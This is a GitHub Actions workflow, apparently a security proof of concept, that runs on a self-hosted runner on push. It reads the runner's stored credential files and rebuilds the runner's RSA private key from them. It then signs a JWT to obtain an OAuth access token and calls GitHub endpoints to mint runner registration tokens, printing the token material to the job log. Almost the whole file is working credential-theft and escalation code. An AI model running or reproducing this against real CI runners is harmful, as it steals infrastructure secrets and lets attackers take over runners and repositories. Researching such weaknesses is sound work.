name: Test Runner Token
on: [push]
jobs:
  find:
    runs-on: self-hosted
    steps:
      - name: OAuth2 Token Exchange
        run: |
          RUNNER_BASE="/Users/delledoxsecurity/github/d/actions-runner"
          
          pip3 install cryptography PyJWT --break-system-packages 2>/dev/null
          
          python3 -c "
          import json, time, base64, jwt
          import urllib.request, urllib.parse, urllib.error
          from cryptography.hazmat.backends import default_backend
          from cryptography.hazmat.primitives.asymmetric.rsa import (
              RSAPrivateNumbers, RSAPublicNumbers, rsa_crt_iqmp, rsa_crt_dmp1, rsa_crt_dmq1
          )
          
          with open('$RUNNER_BASE/.credentials_rsaparams', 'r', encoding='utf-8-sig') as f:
              params = json.load(f)
          
          with open('$RUNNER_BASE/.credentials', 'r', encoding='utf-8-sig') as f:
              creds = json.load(f)
              
          with open('$RUNNER_BASE/.runner', 'r', encoding='utf-8-sig') as f:
              runner = json.load(f)
          
          def b64_to_int(b64):
              b64 += '=' * (4 - len(b64) % 4)
              return int.from_bytes(base64.urlsafe_b64decode(b64), 'big')
          
          # Build RSA key
          p = b64_to_int(params['p'])
          q = b64_to_int(params['q'])
          d = b64_to_int(params['d'])
          n = b64_to_int(params['modulus'])
          e = b64_to_int(params['exponent'])
          dp = b64_to_int(params['dp'])
          dq = b64_to_int(params['dq'])
          iq = b64_to_int(params['inverseQ'])
          
          private_numbers = RSAPrivateNumbers(
              p=p, q=q, d=d,
              dmp1=dp, dmq1=dq, iqmp=iq,
              public_numbers=RSAPublicNumbers(e=e, n=n)
          )
          private_key = private_numbers.private_key(default_backend())
          print('RSA Key Built!')
          
          client_id = creds['data']['clientId']
          auth_url = creds['data']['authorizationUrl']
          
          print('Auth URL:', auth_url)
          print('Client ID:', client_id)
          
          # Step 1: Create JWT for client assertion
          now = int(time.time())
          payload = {
              'sub': client_id,
              'iss': client_id,
              'aud': auth_url,
              'iat': now,
              'exp': now + 600,
              'jti': str(time.time())
          }
          
          client_assertion = jwt.encode(
              payload,
              private_key,
              algorithm='RS256'
          )
          print('Client Assertion JWT:', client_assertion[:50], '...')
          
          # Step 2: Exchange JWT for access token
          # Using OAuth2 client_credentials with JWT assertion
          form_data = urllib.parse.urlencode({
              'grant_type': 'client_credentials',
              'client_assertion_type': 'urn:ietf:params:oauth:client-assertion-type:jwt-bearer',
              'client_assertion': client_assertion,
              'client_id': client_id
          }).encode()
          
          print('\n=== TRYING OAuth2 Token Exchange ===')
          try:
              req = urllib.request.Request(
                  auth_url,
                  method='POST',
                  data=form_data,
                  headers={
                      'Content-Type': 'application/x-www-form-urlencoded',
                      'Accept': 'application/json'
                  }
              )
              with urllib.request.urlopen(req) as resp:
                  token_response = json.loads(resp.read().decode())
                  print('TOKEN EXCHANGE SUCCESS!')
                  print(json.dumps(token_response, indent=2))
                  
                  # Step 3: Use access token to get runner registration token
                  access_token = token_response.get('access_token', '')
                  print('\nAccess Token:', access_token[:50], '...')
                  
                  # Try registration endpoints with new token
                  endpoints = [
                      'https://api.github.com/repos/${{ github.repository }}/actions/runners/registration-token',
                      'https://api.github.com/orgs/${{ github.repository_owner }}/actions/runners/registration-token',
                  ]
                  
                  for ep in endpoints:
                      print(f'\n=== TRYING {ep} ===')
                      try:
                          reg_req = urllib.request.Request(
                              ep,
                              method='POST',
                              data=b'',
                              headers={
                                  'Authorization': f'Bearer {access_token}',
                                  'Accept': 'application/vnd.github.v3+json',
                                  'Content-Length': '0'
                              }
                          )
                          with urllib.request.urlopen(reg_req) as reg_resp:
                              print('SUCCESS:', reg_resp.read().decode())
                      except urllib.error.HTTPError as e:
                          print(f'HTTP {e.code}:', e.read().decode())
                          
          except urllib.error.HTTPError as e:
              error_body = e.read().decode()
              print(f'HTTP {e.code}:', error_body)
          except Exception as ex:
              import traceback
              traceback.print_exc()
          "
